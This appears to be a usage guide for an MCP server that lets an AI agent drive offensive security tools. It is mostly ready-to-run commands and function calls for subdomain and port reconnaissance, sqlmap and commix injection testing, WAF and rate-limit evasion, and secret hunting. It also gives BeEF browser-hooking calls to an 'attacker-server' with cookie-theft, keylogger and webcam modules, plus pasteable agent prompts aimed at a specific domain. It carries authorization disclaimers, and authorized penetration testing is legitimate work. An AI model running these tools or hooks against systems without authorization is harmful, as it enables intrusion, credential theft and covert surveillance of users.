# Red Team Testing Examples - ExternalAttacker-MCP

⚠️ **IMPORTANT:** These commands should ONLY be used on authorized targets during legitimate penetration testing engagements. Ensure you have proper written authorization before testing any systems.

## 🎯 **Phase 1: Reconnaissance**

### **Target: example.com**

#### 1. Subdomain Enumeration
```python
# MCP Function Call
await scan_subdomains(
    target="example.com",
    domain_file=False,
    threads=20
)

# Direct Command
subfinder -domain example.com -all -active -silent -json
```

#### 2. Port Discovery
```python
# MCP Function Call - Quick scan
await scan_ports(
    target="example.com",
    file=False,
    ports="80,443,8080,8443,3000,5000,8000,9000",
    top_ports=False,
    threads=50
)

# MCP Function Call - Comprehensive scan
await scan_ports(
    target="example.com",
    file=False,
    ports="1000",
    top_ports=True,
    threads=100
)

# Direct Commands
naabu -host example.com -port 80,443,8080,8443,3000,5000 -json -silent
naabu -host example.com -top-ports 1000 -json -silent
```

#### 3. HTTP Service Analysis
```python
# MCP Function Call
await analyze_http_services(
    target="example.com",
    file=False,
    threads=30
)

# Direct Command
httpx -target example.com -json -title -status-code -tech-detect -server
```

#### 4. Web Crawling & Endpoint Discovery
```python
# MCP Function Call
await crawl_website(
    target="https://example.com",
    depth=3,
    js_crawl=True,
    include_subs=True,
    threads=20
)

# Direct Command
katana -u https://example.com -d 3 -jc -cs -c 20 -jsonl
```

---

## 🔍 **Phase 2: Vulnerability Scanning**

#### 1. Comprehensive Nuclei Scan
```python
# MCP Function Call - All vulnerabilities
await scan_vulnerabilities(
    target="https://example.com",
    file=False,
    severity="critical,high,medium",
    threads=50,
    rate_limit=100
)

# MCP Function Call - Specific vulnerability types
await scan_vulnerabilities(
    target="https://example.com",
    file=False,
    tags="sqli,xss,rce,lfi,ssrf",
    threads=25
)

# Direct Commands
nuclei -u https://example.com -s critical,high,medium -c 50 -rl 100 -j
nuclei -u https://example.com -tags sqli,xss,rce,lfi,ssrf -j
```

#### 2. Directory/File Fuzzing
```python
# MCP Function Call
await fuzz_endpoints(
    target="https://example.com",
    threads=50,
    wordlist="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"
)

# Direct Command
ffuf -u https://example.com/FUZZ -w common.txt -t 50 -s
```

#### 3. API Endpoint Discovery
```python
# MCP Function Call
await enumerate_apis(
    target="https://example.com",
    threads=30,
    methods="GET,POST,PUT,DELETE",
    wordlist="api-endpoints.txt"
)

# Direct Command
kiterunner scan https://example.com -w api-endpoints.txt -t 30 --methods GET,POST,PUT,DELETE
```

---

## 💥 **Phase 3: Exploitation Testing**

#### 1. SQL Injection Testing
```python
# MCP Function Call - Basic SQLi test
await test_sql_injection(
    target="https://example.com/login",
    data="username=admin&password=test",
    method="POST",
    level=3,
    risk=2
)

# MCP Function Call - Advanced SQLi with tamper
await test_sql_injection(
    target="https://example.com/search?q=test",
    level=5,
    risk=3,
    technique="BEUST",
    tamper="space2comment,randomcase"
)

# Direct Commands
sqlmap -u "https://example.com/login" --data="username=admin&password=test" --level=3 --risk=2 --batch
sqlmap -u "https://example.com/search?q=test" --level=5 --risk=3 --technique=BEUST --tamper=space2comment,randomcase --batch
```

#### 2. XSS Vulnerability Testing
```python
# MCP Function Call
await scan_xss(
    target="https://example.com",
    file=False,
    threads=50,
    mining_dom=True,
    mining_dict=True
)

# Direct Command
dalfox url https://example.com -w 50 --mining-dom --mining-dict -o json
```

#### 3. Comprehensive ZAP Scan
```python
# MCP Function Call - Full active scan
await scan_with_zap(
    target="https://example.com",
    spider=True,
    ajax_spider=True,
    active_scan=True,
    passive_scan=True
)

# Direct Command
zap-full-scan.py -t https://example.com -j /tmp/zap_report.json -r /tmp/zap_report.html
```

#### 4. Command Injection Testing
```python
# MCP Function Call - Basic command injection test
await test_command_injection(
    target="https://example.com/search?cmd=test",
    level=2,
    technique="classic",
    timeout=30
)

# MCP Function Call - Advanced command injection with evasion
await test_command_injection(
    target="https://example.com/admin/system",
    data="command=ls&submit=execute",
    method="POST",
    level=3,
    technique="time-based",
    tamper="space2ifs,base64encode"
)

# Direct Commands
commix --url "https://example.com/search?cmd=test" --level=2 --technique=classic --batch
commix --url "https://example.com/admin/system" --data="command=ls&submit=execute" --level=3 --technique=time-based --batch
```

---

## 🏢 **Phase 4: Professional Vulnerability Assessment**

#### 1. Nessus Professional Scanning
```python
# MCP Function Call - Basic Nessus scan
await scan_with_nessus(
    target="192.168.1.100",
    scan_template="basic",
    nessus_url="https://localhost:8834",
    access_key="your_access_key",
    secret_key="your_secret_key"
)

# MCP Function Call - Advanced Nessus scan
await scan_with_nessus(
    target="192.168.1.0/24",
    scan_template="advanced",
    nessus_url="https://your-nessus-server:8834",
    access_key="your_access_key",
    secret_key="your_secret_key",
    scanner_id=1,
    folder_id=2
)

# Get Nessus scan results
await get_nessus_results(
    scan_id=123,
    nessus_url="https://localhost:8834",
    access_key="your_access_key",
    secret_key="your_secret_key",
    export_format="nessus"
)
```

#### 2. Browser Exploitation with BeEF
```python
# MCP Function Call - Basic BeEF hook injection
await exploit_with_beef(
    target_url="https://example.com",
    beef_server="http://localhost:3000",
    beef_user="beef",
    beef_pass="beef",
    hook_method="iframe"
)

# MCP Function Call - Advanced BeEF with payloads
await exploit_with_beef(
    target_url="https://example.com/login",
    beef_server="http://your-beef-server:3000",
    beef_user="admin",
    beef_pass="strongpassword",
    hook_method="social",
    payload_modules="get_cookie,screenshot,keylogger"
)

# Direct BeEF Usage
# Start BeEF server: cd ~/tools/beef && ./beef
# Access web interface: http://localhost:3000/ui/panel
# Hook browsers and execute modules
```

---

## 🔐 **Phase 5: Secret & Credential Hunting**

#### 1. Git Repository Secret Scanning
```python
# MCP Function Call - GitHub org scan
await scan_secrets(
    target="example-org",
    scan_type="github",
    github_token="your_github_token",
    threads=10
)

# MCP Function Call - Git repository scan
await scan_secrets(
    target="https://github.com/example/repo.git",
    scan_type="git",
    threads=8
)

# Direct Commands
trufflehog github --org=example-org --token=your_token -j 10 --json
trufflehog git https://github.com/example/repo.git -j 8 --json
```

#### 2. Web Application Secret Scanning
```python
# MCP Function Call
await scan_secrets(
    target="/tmp/website_source",
    scan_type="filesystem",
    exclude_paths="node_modules,vendor,.git",
    threads=12
)

# Direct Command
trufflehog filesystem /tmp/website_source --exclude-paths=node_modules,vendor,.git -j 12 --json
```

---

## 🎯 **Real-World Attack Scenarios**

### **Scenario 1: E-commerce Application**
```bash
# 1. Find subdomains
subfinder -domain shop.example.com -all -silent | httpx -silent -json

# 2. Discover admin panels
ffuf -u https://shop.example.com/FUZZ -w admin-panels.txt -fs 404

# 3. Test for SQLi in product search
sqlmap -u "https://shop.example.com/search?q=*" --level=3 --risk=2 --batch

# 4. Check for XSS in user inputs
dalfox url https://shop.example.com/search -w 30 --mining-dom

# 5. API endpoint discovery
kiterunner scan https://shop.example.com -w api-endpoints.txt -t 20
```

### **Scenario 2: Corporate Infrastructure**
```bash
# 1. Comprehensive subdomain discovery
subfinder -domain corp.example.com -all | dnsx -silent -a -resp

# 2. Port scan for internal services
naabu -host corp.example.com -top-ports 1000 -scan-all-ips

# 3. Technology fingerprinting
httpx -l subdomains.txt -tech-detect -server -title -json

# 4. Vulnerability assessment
nuclei -l live_hosts.txt -s critical,high -tags cve,rce,sqli -c 50

# 5. Check for exposed secrets
trufflehog github --org=example-corp --token=token -j 10 --json
```

### **Scenario 3: API-First Application**
```bash
# 1. API endpoint enumeration
kiterunner scan https://api.example.com -w api-routes.txt -t 30

# 2. GraphQL discovery
ffuf -u https://api.example.com/FUZZ -w graphql-endpoints.txt

# 3. API vulnerability scanning
nuclei -u https://api.example.com -tags api,graphql,jwt -j

# 4. Authentication bypass testing
sqlmap -u "https://api.example.com/login" --data='{"username":"admin","password":"test"}' --level=3
```

---

## 🚀 **Advanced Multi-Target Workflows**

### **Bulk Subdomain Assessment**
```python
# 1. Create subdomain list
await scan_subdomains(target="example.com", domain_file=False)

# 2. Mass HTTP analysis
await analyze_http_services(target="subdomains.txt", file=True, threads=50)

# 3. Bulk vulnerability scanning
await scan_vulnerabilities(target="live_hosts.txt", file=True, severity="critical,high")
```

### **Full Infrastructure Assessment**
```bash
#!/bin/bash
TARGET="example.com"

echo "🎯 Starting assessment of $TARGET"

# Phase 1: Discovery
echo "📡 Phase 1: Discovery"
subfinder -domain $TARGET -all -silent | tee subdomains.txt
cat subdomains.txt | httpx -silent | tee live_hosts.txt
cat live_hosts.txt | naabu -top-ports 1000 -silent | tee open_ports.txt

# Phase 2: Analysis
echo "🔍 Phase 2: Analysis"
cat live_hosts.txt | httpx -tech-detect -title -server -json | tee http_analysis.json
cat live_hosts.txt | katana -d 2 -c 30 -silent | tee endpoints.txt

# Phase 3: Vulnerability Assessment
echo "💥 Phase 3: Vulnerability Assessment"
nuclei -l live_hosts.txt -s critical,high,medium -c 50 -json | tee nuclei_results.json
cat live_hosts.txt | dalfox pipe -w 30 -o xss_results.json

# Phase 4: Reporting
echo "📊 Phase 4: Generating Report"
echo "Assessment complete for $TARGET"
echo "Results saved in: nuclei_results.json, xss_results.json, http_analysis.json"
```

---

## 🛡️ **Defense Evasion Techniques**

### **Rate Limiting Bypass**
```bash
# Slow and low approach
nuclei -u https://example.com -rl 10 -c 5 -timeout 10

# Distributed scanning
httpx -l targets.txt -threads 10 -delay 2s -random-agent
```

### **WAF Evasion**
```bash
# SQLMap with evasion
sqlmap -u "https://example.com/search?q=test" --tamper=space2comment,charencode,randomcase --delay=3 --randomize=User-Agent

# Custom headers and encoding
ffuf -u https://example.com/FUZZ -w wordlist.txt -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 192.168.1.1"
```

---

## 📊 **Integration with Reporting**

### **DefectDojo Upload Example**
```python
# After vulnerability scanning, upload results
await upload_to_defectdojo(
    file_path="/tmp/nuclei_results.json",
    engagement_id=123,
    defectdojo_url="https://defectdojo.company.com",
    api_token="your_api_token",
    scan_type="Nuclei Scan",
    test_title=f"Security Assessment - {target}"
)
```

---

## ⚠️ **Legal and Ethical Guidelines**

1. **Always obtain written authorization** before testing
2. **Respect scope limitations** defined in your engagement
3. **Use appropriate rate limiting** to avoid DoS
4. **Document all findings** with proper evidence
5. **Follow responsible disclosure** for any findings
6. **Maintain confidentiality** of client data

## 🎯 **Quick Command Reference**

| **Phase** | **Tool** | **Command Template** |
|-----------|----------|---------------------|
| **Recon** | subfinder | `subfinder -domain TARGET -all -silent` |
| **Recon** | httpx | `httpx -target TARGET -tech-detect -json` |
| **Recon** | naabu | `naabu -host TARGET -top-ports 1000` |
| **Vulns** | nuclei | `nuclei -u TARGET -s critical,high -c 50` |
| **Vulns** | sqlmap | `sqlmap -u TARGET --level=3 --risk=2 --batch` |
| **Vulns** | dalfox | `dalfox url TARGET -w 50 --mining-dom` |
| **Vulns** | commix | `commix --url TARGET --level=2 --batch` |
| **Professional** | nessus | `MCP: scan_with_nessus(target, credentials)` |
| **Exploitation** | beef | `MCP: exploit_with_beef(target_url, beef_server)` |
| **APIs** | kiterunner | `kiterunner scan TARGET -w wordlist.txt` |
| **Secrets** | trufflehog | `trufflehog git TARGET --json` |

## 🎯 **Advanced Professional Scenarios**

### **Scenario 4: Enterprise Infrastructure Assessment**
```bash
# 1. Professional vulnerability scanning with Nessus
# Launch comprehensive Nessus scan
scan_with_nessus(target="192.168.1.0/24", scan_template="advanced", access_key="KEY", secret_key="SECRET")

# 2. Command injection testing on web applications
commix --url "https://corp.example.com/admin/system?cmd=test" --level=3 --technique=time-based --batch

# 3. Browser exploitation for social engineering
exploit_with_beef(target_url="https://corp.example.com/portal", hook_method="social", payload_modules="get_cookie,screenshot")

# 4. Monitor Nessus scan progress and get results
get_nessus_results(scan_id=123, export_format="nessus")
```

### **Scenario 5: Client-Side Exploitation Campaign**
```bash
# 1. Set up BeEF server for browser hooking
# Start BeEF: cd ~/tools/beef && ./beef

# 2. Inject hooks into discovered endpoints
exploit_with_beef(
    target_url="https://target.com/vulnerable-page",
    beef_server="http://attacker-server:3000",
    hook_method="iframe",
    payload_modules="get_cookie,keylogger,screenshot,webcam"
)

# 3. Test for command injection in admin panels
test_command_injection(
    target="https://target.com/admin/execute",
    data="cmd=whoami&action=run",
    method="POST",
    level=3,
    technique="time-based"
)
```

### **Scenario 6: Complete Professional Assessment**
```python
# Full enterprise-grade assessment workflow

# Phase 1: Professional Vulnerability Scanning
nessus_scan = await scan_with_nessus(
    target="10.0.0.0/8",
    scan_template="advanced",
    nessus_url="https://nessus-server:8834",
    access_key="your_access_key",
    secret_key="your_secret_key"
)

# Phase 2: Web Application Security Testing
commix_results = await test_command_injection(
    target="https://webapp.target.com/admin/system",
    level=3,
    technique="classic,eval-based,time-based",
    timeout=60
)

# Phase 3: Client-Side Exploitation
beef_hooks = await exploit_with_beef(
    target_url="https://webapp.target.com/login",
    beef_server="http://your-beef:3000",
    hook_method="social",
    payload_modules="get_cookie,screenshot,keylogger,webcam"
)

# Phase 4: Results Collection
nessus_results = await get_nessus_results(
    scan_id=nessus_scan['scan_id'],
    export_format="nessus"
)
```

## 🛠️ **Tool Installation Quick Commands**

### **Install Missing Tools**
```bash
# Install Commix
brew install commix  # macOS
# OR
git clone https://github.com/commixproject/commix.git && cd commix && python3 setup.py install

# Install BeEF Framework  
cd ~/tools && git clone https://github.com/beefproject/beef
cd beef && bundle install

# Install Nessus (Commercial - requires license)
# Download from: https://www.tenable.com/downloads/nessus
# Follow platform-specific installation instructions
```

### **Start Services**
```bash
# Start BeEF server
cd ~/tools/beef && ./beef

# Start Nessus service
sudo systemctl start nessusd  # Linux
sudo launchctl load /Library/LaunchDaemons/com.tenablesecurity.nessusd.plist  # macOS

# Access web interfaces
# BeEF: http://localhost:3000/ui/panel
# Nessus: https://localhost:8834
```

## 🔥 **Advanced MCP Function Examples**

### **Professional Nessus Integration**
```
Please run a Nessus vulnerability scan using scan_with_nessus with:
- target: "app.votal.ai"
- scan_template: "basic"
- nessus_url: "https://localhost:8834"
- access_key: "your_access_key"
- secret_key: "your_secret_key"
```

### **Command Injection Testing**
```
Please test for command injection using test_command_injection with:
- target: "https://app.votal.ai/search?q=test"
- level: 2
- technique: "classic"
- timeout: 30
```

### **Browser Exploitation Setup**
```
Please set up browser exploitation using exploit_with_beef with:
- target_url: "https://app.votal.ai"
- beef_server: "http://localhost:3000"
- hook_method: "iframe"
- payload_modules: "get_cookie,screenshot"
```

Use these examples as starting points and adjust parameters based on your specific engagement requirements and target characteristics. 